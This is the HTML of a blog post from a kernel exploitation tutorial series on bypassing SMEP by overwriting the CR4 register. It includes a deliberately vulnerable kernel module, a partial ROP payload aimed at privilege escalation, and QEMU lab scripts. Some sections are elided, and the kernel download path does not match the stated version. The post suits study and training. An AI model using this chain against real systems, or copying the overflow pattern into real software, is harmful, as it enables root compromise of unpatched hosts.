<!doctype html><html lang=en>
<head>
<title>Linux Kernel 0x02 :: Bypass SMEP with CR4 Overwrite :: Anvbis</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="Bypassing supervisor mode execution protection (SMEP), a kernel exploit mitigation feature. Part three of a series of posts on Linux kernel exploitation techniques.">
<meta name=keywords content>
<meta name=robots content="noodp">
<link rel=canonical href=https://anvbis.github.io/posts/linux-kernel-2-bypass-smep/>
<link rel=stylesheet href=https://anvbis.github.io/assets/style.css>
<link rel=stylesheet href=https://anvbis.github.io/assets/green.css>
<link rel=apple-touch-icon href=https://anvbis.github.io/img/apple-touch-icon-192x192.png>
<link rel="shortcut icon" href=https://anvbis.github.io/img/favicon/green.png>
<meta name=twitter:card content="summary">
<meta property="og:locale" content="en">
<meta property="og:type" content="article">
<meta property="og:title" content="Linux Kernel 0x02 :: Bypass SMEP with CR4 Overwrite">
<meta property="og:description" content="Bypassing supervisor mode execution protection (SMEP), a kernel exploit mitigation feature. Part three of a series of posts on Linux kernel exploitation techniques.">
<meta property="og:url" content="https://anvbis.github.io/posts/linux-kernel-2-bypass-smep/">
<meta property="og:site_name" content="Anvbis">
<meta property="og:image" content="https://anvbis.github.io/img/favicon/green.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">
<meta property="article:section" content="Linux Kernel Exploitation">
<meta property="article:published_time" content="2022-01-26 00:00:00 +0000 UTC">
</head>
<body class=green>
<div class="container center headings--one-size">
<header class=header>
<div class=header__inner>
<div class=header__logo>
<a href=/>
<div class=logo>
Anvbis
</div>
</a>
</div>
<div class=menu-trigger>menu</div>
</div>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/about>About</a></li>
<li><a href=/categories>Categories</a></li>
<li><a href=/posts>Posts</a></li>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/about>About</a></li>
<li><a href=/categories>Categories</a></li>
<li><a href=/posts>Posts</a></li>
</ul>
</nav>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>
<a href=https://anvbis.github.io/posts/linux-kernel-2-bypass-smep/>Linux Kernel 0x02 :: Bypass SMEP with CR4 Overwrite</a></h1>
<div class=post-meta>
<span class=post-date>
2022-01-26
</span>
</div>
<span class=post-tags>
#<a href=https://anvbis.github.io/tags/linux/>linux</a>&nbsp;
#<a href=https://anvbis.github.io/tags/kernel/>kernel</a>&nbsp;
</span>
<div class=post-content><div>
<h2 id=table-of-contents>Table of Contents<a href=#table-of-contents class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<ol>
<li><a href=#overview-of-smep>Overview of SMEP</a></li>
<li><a href=#overwriting-the-control-register>Overwriting the Control Register</a></li>
<li><a href=#a-vulnerable-kernel-module>A Vulnerable Kernel Module</a></li>
<li><a href=#building-a-rop-chain>Building a ROP Chain</a></li>
<li><a href=#environment-setup>Environment Setup</a></li>
<li><a href=#building-the-exploit>Building the Exploit</a></li>
</ol>
<h2 id=overview-of-smep>Overview of SMEP<a href=#overview-of-smep class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>Supervisor mode execution protection (SMEP) is a kernel exploit mitigation feature that marks all user-space memory pages as non-executable. This means we can still read/write to user-space memory, but we are unable to execute any code stored in user-space. You can think of this as the equivalent of kernel-space DEP.</p>
<p>In the kernel, SMEP is enabled by setting the 20th bit of the control register, <code>cr4</code>. We can potentially bypass this exploit mitigation by unsetting this bit.</p>
<p>As we cannot execute code in user-space, we&rsquo;ll need to find some other way to control process execution. We can do this via return-oriented programming (ROP).</p>
<p>Note: Attempting to overwrite the <code>cr4</code> register in newer kernel versions will cause the kernel to panic. This is as newer kernels attempt to &lsquo;pin&rsquo; the sensitive bits in the <code>cr4</code> and <code>cr0</code> registers, detecting any changes made to them as an exploit mitigation feature.</p>
<h2 id=overwriting-the-control-register>Overwriting the Control Register<a href=#overwriting-the-control-register class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>To overwrite the value of the <code>cr4</code> register, we can use a kernel-space function called <code>native_write_cr4</code>. We can find the address of this function by reading <code>/proc/kallsyms</code>.</p>
<pre><code>/ # cat /proc/kallsyms | grep native_write_cr4
ffffffff814443e0 T native_write_cr4
</code></pre><p>Whatever value is passed into <code>native_write_cr4</code> will replace the value of the <code>cr4</code> register. Meaning we can modify the bit that enables SMEP protections in kernel-space.</p>
<h2 id=a-vulnerable-kernel-module>A Vulnerable Kernel Module<a href=#a-vulnerable-kernel-module class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>We can use the same vulnerable kernel module as in the return to user-space post to demonstrate this technique. This kernel module has buffer overflow vulnerabilities in both its <code>challenge_read</code> and <code>challenge_write</code> function handlers.</p>
<p>For an overview of the vulnerabilities present in this kernel module, please read the previous post.</p>
<p><a href=/files/linux-kernel/2/challenge.c>challenge.c</a></p>
<div class=collapsable-code>
<input id=1 type=checkbox checked>
<label for=1>
<span class=collapsable-code__language>c</span>
<span class=collapsable-code__title>challenge.c</span>
<span class=collapsable-code__toggle data-label-expand=Show data-label-collapse=Hide></span>
</label>
<pre class=language-c><code>
#include &lt;linux/kernel.h&gt;
#include &lt;linux/module.h&gt;
#include &lt;linux/fs.h&gt;
#include &lt;linux/proc_fs.h&gt;
#include &lt;linux/uaccess.h&gt;

MODULE_LICENSE(&#34;GPL&#34;);

char out[256];

static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
    char tmp[128];
    memcpy(out, tmp, len);
    return copy_to_user(buf, out, len);
}

static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
    char tmp[128];
    if (copy_from_user(out, buf, len))
        return -EINVAL;

    memcpy(tmp, out, len);
    return 0;
}

static int challenge_open(struct inode *inode, struct file *fp)
{
    return 0;
}

static int challenge_release(struct inode *inode, struct file *fp)
{
    return 0;
}

static struct file_operations fops = {
    .read    = challenge_read,
    .write   = challenge_write,
    .open    = challenge_open,
    .release = challenge_release
};

struct proc_dir_entry *proc_entry;

int init_module(void)
{
    proc_entry = proc_create(&#34;challenge&#34;, 0666, NULL, &amp;fops);
    return 0;
}

void cleanup_module(void)
{
    if (proc_entry) {
        proc_remove(proc_entry);
    }
}
</code></pre>
</div>
<h2 id=building-a-rop-chain>Building a ROP Chain<a href=#building-a-rop-chain class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>&mldr;</p>
<pre><code>~/pwnkernel/ $ rp++ -f linux-4.4
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>overflow_buffer</span>(<span style=color:#66d9ef>int</span> fd, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> canary)
{
    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> payload[<span style=color:#ae81ff>21</span>];

    payload[<span style=color:#ae81ff>16</span>] <span style=color:#f92672>=</span> canary;
    
    payload[<span style=color:#ae81ff>17</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xffffffff81001518</span>; <span style=color:#75715e>// pop rdi; ret
</span><span style=color:#75715e></span>    payload[<span style=color:#ae81ff>18</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x6f0</span>;              <span style=color:#75715e>// rdi = 0x6f0
</span><span style=color:#75715e></span>    payload[<span style=color:#ae81ff>19</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xffffffff8102dab0</span>; <span style=color:#75715e>// native_write_cr4
</span><span style=color:#75715e></span>
    payload[<span style=color:#ae81ff>20</span>] <span style=color:#f92672>=</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>)escalate_privileges;

    write(fd, payload, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>) <span style=color:#f92672>*</span> <span style=color:#ae81ff>21</span>);
}
</code></pre></div><h2 id=environment-setup>Environment Setup<a href=#environment-setup class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>&mldr;</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#75715e>#!/bin/bash -e
</span><span style=color:#75715e></span>
export KERNEL_VERSION<span style=color:#f92672>=</span>4.4
export BUSYBOX_VERSION<span style=color:#f92672>=</span>1.32.0

...
</code></pre></div><p>You can find the whole <code>build.sh</code> script in the code snippet below.</p>
<div class=collapsable-code>
<input id=1 type=checkbox checked>
<label for=1>
<span class=collapsable-code__language>sh</span>
<span class=collapsable-code__title>build.sh</span>
<span class=collapsable-code__toggle data-label-expand=Show data-label-collapse=Hide></span>
</label>
<pre class=language-sh><code>
#!/bin/bash -e

export KERNEL_VERSION=4.4
export BUSYBOX_VERSION=1.32.0

#
# dependencies
#
echo &#34;[&#43;] Checking / installing dependencies...&#34;
sudo apt-get -q update
sudo apt-get -q install -y bison flex libelf-dev cpio build-essential libssl-dev qemu-system-x86

#
# linux kernel
#

echo &#34;[&#43;] Downloading kernel...&#34;
wget -q -c https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/linux-$KERNEL_VERSION.tar.gz
[ -e linux-$KERNEL_VERSION ] || tar xzf linux-$KERNEL_VERSION.tar.gz

echo &#34;[&#43;] Building kernel...&#34;
make -C linux-$KERNEL_VERSION defconfig
echo &#34;CONFIG_NET_9P=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_NET_9P_DEBUG=n&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_9P_FS=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_9P_FS_POSIX_ACL=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_9P_FS_SECURITY=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_NET_9P_VIRTIO=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_VIRTIO_PCI=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_VIRTIO_BLK=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_VIRTIO_BLK_SCSI=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_VIRTIO_NET=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_VIRTIO_CONSOLE=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_HW_RANDOM_VIRTIO=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_DRM_VIRTIO_GPU=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_VIRTIO_PCI_LEGACY=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_VIRTIO_BALLOON=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_VIRTIO_INPUT=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_CRYPTO_DEV_VIRTIO=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_BALLOON_COMPACTION=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_PCI=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_PCI_HOST_GENERIC=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_GDB_SCRIPTS=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_DEBUG_INFO=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_DEBUG_INFO_REDUCED=n&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_DEBUG_INFO_SPLIT=n&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_DEBUG_FS=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_DEBUG_INFO_DWARF4=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_DEBUG_INFO_BTF=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
echo &#34;CONFIG_FRAME_POINTER=y&#34; &gt;&gt; linux-$KERNEL_VERSION/.config
make -C linux-$KERNEL_VERSION -j16 bzImage

#
# Busybox
#

echo &#34;[&#43;] Downloading busybox...&#34;
wget -q -c https://busybox.net/downloads/busybox-$BUSYBOX_VERSION.tar.bz2
[ -e busybox-$BUSYBOX_VERSION ] || tar xjf busybox-$BUSYBOX_VERSION.tar.bz2

echo &#34;[&#43;] Building busybox...&#34;
make -C busybox-$BUSYBOX_VERSION defconfig
sed -i &#39;s/# CONFIG_STATIC is not set/CONFIG_STATIC=y/g&#39; busybox-$BUSYBOX_VERSION/.config
make -C busybox-$BUSYBOX_VERSION -j16
make -C busybox-$BUSYBOX_VERSION install

#
# filesystem
#

echo &#34;[&#43;] Building filesystem...&#34;
cd fs
mkdir -p bin sbin etc proc sys usr/bin usr/sbin root home/ctf
cd ..
cp -a busybox-$BUSYBOX_VERSION/_install/* fs

#
# modules
#

echo &#34;[&#43;] Building modules...&#34;
cd src
make
cd ..
cp src/*.ko fs/
</code></pre>
</div>
<p>Taking our <code>launch.sh</code> script from the previous Linux kernel exploitation post (return to user-space), all we need to add is a line with the <code>+smep</code> flag.</p>
<p>Note that we will also need to update the path to the kernel image (as we are using Linux 4.4 instead of Linux 5.4).</p>
<div class=collapsable-code>
<input id=2 type=checkbox>
<label for=2>
<span class=collapsable-code__language>sh</span>
<span class=collapsable-code__title>launch.sh</span>
<span class=collapsable-code__toggle data-label-expand=Show data-label-collapse=Hide></span>
</label>
<pre class=language-sh><code>
#!/bin/bash

# build root fs
pushd fs
find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; ../initramfs.cpio.gz
popd

# launch
/usr/bin/qemu-system-x86_64 \
    -kernel linux-4.4/arch/x86/boot/bzImage \
    -initrd $PWD/initramfs.cpio.gz \
    -fsdev local,security_model=passthrough,id=fsdev0,path=$HOME \
    -device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \
    -nographic \
    -monitor none \
    -s \
    -cpu kvm64,&#43;smep \
    -append &#34;console=ttyS0 nokaslr nopti quiet&#34;
</code></pre>
</div>
<p>We can run this script like before in order to be dropped into a root shell on our kernel emulator.</p>
<h2 id=building-the-exploit>Building the Exploit<a href=#building-the-exploit class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>&mldr;</p>
<h2 id=appendix>Appendix<a href=#appendix class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<ul>
<li><a href=https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/>Learning Linux Kernel Exploitation - Part 2</a></li>
<li><a href=https://archive.org/details/youtube-g55Cq4WWykI>Hacking RootKit Development 16 - Bypass Linux Kernel 3.15 x86 CR4 & CR0 pinning protections</a></li>
</ul>
</div></div>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user">
<span>Anvbis &copy; 2022</span>
</div>
</div>
</footer>
<script src=https://anvbis.github.io/assets/main.js></script>
<script src=https://anvbis.github.io/assets/prism.js></script>
</div>
</body>
</html>